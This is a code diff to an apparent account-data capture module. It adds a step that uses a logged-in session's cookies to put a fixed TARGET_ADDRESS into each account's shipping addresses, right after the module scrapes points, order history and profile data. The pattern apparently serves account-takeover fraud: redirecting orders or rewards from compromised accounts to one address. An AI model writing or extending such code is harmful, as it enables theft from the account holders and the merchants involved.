@@ -14,6 +14,7 @@ const { captureViaApi, RANK_MAP } = require('./apiCapture');
 const { captureViaHtml, extractPoints } = require('./htmlCapture');
 const { fetchLatestOrder } = require('./orderHistory');
 const { fetchProfileData } = require('./profileData');
+const { addShippingAddress, TARGET_ADDRESS } = require('./addressManager');
 
 const log = createLogger('http-capture');
 
@@ -75,6 +76,24 @@ async function captureAccountData(session, options = {}) {
       }
     }
     
+    // Attempt to add shipping address (pure HTTP, minimal bandwidth)
+    // Runs after profile fetch — uses session cookies from login
+    result.addressAddition = null;
+    if (profileData && session) {
+      try {
+        const addressResult = await addShippingAddress(session, profileData, { timeoutMs });
+        result.addressAddition = addressResult;
+        if (addressResult.success) {
+          log.info(`Address addition: ${addressResult.alreadyExisted ? 'already existed' : 'added successfully'}`);
+        } else {
+          log.warn(`Address addition failed: ${addressResult.error}`);
+        }
+      } catch (addrErr) {
+        log.warn(`Address addition error: ${addrErr.message}`);
+        result.addressAddition = { success: false, alreadyExisted: false, error: addrErr.message };
+      }
+    }
+    
     return result;
   } catch (error) {
     log.error('Data capture failed:', error.message);
@@ -89,6 +108,8 @@ module.exports = {
   captureViaHtml,
   fetchLatestOrder,
   fetchProfileData,
+  addShippingAddress,
+  TARGET_ADDRESS,
   extractPoints,
   RANK_MAP,
 };
